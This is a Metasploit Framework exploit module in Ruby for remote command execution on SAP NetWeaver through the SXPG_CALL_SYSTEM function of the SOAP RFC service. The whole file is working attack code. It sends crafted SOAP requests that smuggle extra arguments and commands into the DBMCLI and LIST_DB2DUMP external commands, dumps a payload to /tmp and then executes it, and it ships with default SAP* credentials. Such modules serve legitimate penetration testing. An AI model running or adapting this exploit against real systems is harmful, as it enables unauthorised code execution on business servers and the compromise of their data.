##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

##
# This module is based on, inspired by, or is a port of a plugin available in
# the Onapsis Bizploit Opensource ERP Penetration Testing framework -
# http://www.onapsis.com/research-free-solutions.php.
# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts
# in producing the Metasploit modules and was happy to share his knowledge and
# experience - a very cool guy.
#
# The following guys from ERP-SCAN deserve credit for their contributions -
# Alexandr Polyakov, Alexey Sintsov, Alexey Tyurin, Dmitry Chastukhin and
# Dmitry Evdokimov.
#
# I'd also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis
# who have Beta tested the modules and provided excellent feedback. Some people
# just seem to enjoy hacking SAP :)
##

require 'msf/core'

class Metasploit4 < Msf::Exploit::Remote

	Rank = GreatRanking

	include Msf::Exploit::CmdStagerVBS
	include Msf::Exploit::EXE
	include Msf::Exploit::Remote::HttpClient

	def initialize
		super(
			'Name' => 'SAP SOAP RFC SXPG_CALL_SYSTEM Remote Command Execution',
			'Description' => %q{
					This module abuses the SAP NetWeaver SXPG_CALL_SYSTEM function, on the SAP SOAP
				RFC Service, to execute remote commands. This module needs SAP credentials with
				privileges to use the /sap/bc/soap/rfc in order to work. The module has been tested
				successfully on Windows 2008 64 bits and Linux 64 bits platforms.
			},
			'References' =>
				[
					[ 'URL', 'http://labs.mwrinfosecurity.com/tools/2012/04/27/sap-metasploit-modules/' ]
				],
			'DisclosureDate' => 'Mar 26 2013',
			'Platform'       => ['win', 'unix'],
			'Targets' => [
				[ 'Linux',
					{
						'Arch'     => ARCH_CMD,
						'Platform' => 'unix'
						#'Payload'  =>
							#{
								#'DisableNops' => true,
								#'Space'       => 232,
								#'Compat'      =>
									#{
										#'PayloadType' => 'cmd',
										#'RequiredCmd' => 'perl ruby',
									#}
							#}
					}
				],
				[ 'Windows x64',
					{
						'Arch' => ARCH_X86_64,
						'Platform' => 'win'
					}
				]
			],
			'DefaultTarget' => 0,
			'Privileged' => false,
			'Author' =>
				[
					'nmonkee'
				],
			'License' => MSF_LICENSE
		)
		register_options(
			[
				Opt::RPORT(8000),
				OptString.new('CLIENT', [true, 'SAP Client', '001']),
				OptString.new('USERNAME', [true, 'Username', 'SAP*']),
				OptString.new('PASSWORD', [true, 'Password', '06071992'])
			], self.class)
		register_advanced_options(
			[
				OptInt.new('PAYLOAD_SPLIT', [true, 'Size of payload segments (Windows Target)', 250]),
			], self.class)
	end

	def send_soap_request(data)
		res = send_request_cgi({
			'uri' => '/sap/bc/soap/rfc',
			'method' => 'POST',
			'data' => data,
			'authorization' => basic_auth(datastore['USERNAME'], datastore['PASSWORD']),
			'cookie' => 'sap-usercontext=sap-language=EN&sap-client=' + datastore['CLIENT'],
			'ctype' => 'text/xml; charset=UTF-8',
			'headers' => {
				'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
			},
			'vars_get' => {
				'sap-client' => datastore['CLIENT'],
				'sap-language' => 'EN'
			}
		})
		return res
	end

	def build_soap_request(command, sap_command, sap_os)
		data = "<?xml version=\"1.0\" encoding=\"utf-8\" ?>"
		data << "<env:Envelope xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:env=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">"
		data << "<env:Body>"
		data << "<n1:SXPG_CALL_SYSTEM xmlns:n1=\"urn:sap-com:document:sap:rfc:functions\" env:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">"
		data << "<ADDITIONAL_PARAMETERS>#{command}</ADDITIONAL_PARAMETERS>"
		data << "<COMMANDNAME>#{sap_command}</COMMANDNAME>"
		data << "<OPERATINGSYSTEM>#{sap_os}</OPERATINGSYSTEM>"
		data << "<EXEC_PROTOCOL><item></item></EXEC_PROTOCOL>"
		data << "</n1:SXPG_CALL_SYSTEM>"
		data << "</env:Body>"
		data << "</env:Envelope>"
		return data
	end

	def check
		data = rand_text_alphanumeric(4 + rand(4))
		res = send_soap_request(data)
		if res and res.code == 500 and res.body =~ /faultstring/
			return Exploit::CheckCode::Detected
		end
		return Exploit::CheckCode::Safe
	end

	def exploit
		if target.name =~ /Windows/
			linemax = datastore['PAYLOAD_SPLIT']
			vprint_status("#{rhost}:#{rport} - Using custom payload size of #{linemax}") if linemax != 250
			print_status("#{rhost}:#{rport} - Sending SOAP SXPG_CALL_SYSTEM request")
			execute_cmdstager({ :delay => 0.35, :linemax => linemax })
		elsif target.name =~ /Linux/
			file = rand_text_alphanumeric(5)
			stage_one = create_unix_payload(1,file)
			print_status("#{rhost}:#{rport} - Dumping the payload to /tmp/#{file}...")
			res = send_soap_request(stage_one)
			if res and res.code == 200 and res.body =~ /External program terminated/
				print_good("#{rhost}:#{rport} - Payload dump was successful")
			else
				fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Payload dump failed")
			end
			stage_two = create_unix_payload(2,file)
			print_status("#{rhost}:#{rport} - Executing /tmp/#{file}...")
			send_soap_request(stage_two)
		end
	end

	def create_unix_payload(stage, file)
		command = ""
		if target.name =~ /Linux/
			if stage == 1
				my_payload = payload.encoded.gsub(" ","\t")
				my_payload.gsub!("&","&amp;")
				my_payload.gsub!("<","&lt;")
				command = "-o /tmp/" + file + " -n pwnie" + "\n!"
				command << my_payload
				command << "\n"
			elsif stage == 2
				command = "-ic /tmp/" + file
			end

		end

		return build_soap_request(command.to_s, "DBMCLI", "ANYOS")
	end

	def execute_command(cmd, opts)
		command = cmd.gsub(/&/, "&amp;")
		command.gsub!(/%TEMP%\\/, "")
		data = build_soap_request("&amp;#{command}", "LIST_DB2DUMP", "ANYOS")
		begin
			res = send_soap_request(data)
			if res and res.code == 200
				return
			else
				if res and res.body =~ /faultstring/
					error = res.body.scan(%r{<faultstring>(.*?)</faultstring>})
					0.upto(error.length-1) do |i|
						vprint_error("#{rhost}:#{rport} - Error #{error[i]}")
					end
				end
				fail_with(Exploit::Failure::Unknown, "#{rhost}:#{rport} - Error injecting command")
			end
		rescue ::Rex::ConnectionError
			fail_with(Exploit::Failure::Unreachable, "#{rhost}:#{rport} - Unable to connect")
		end
	end
end
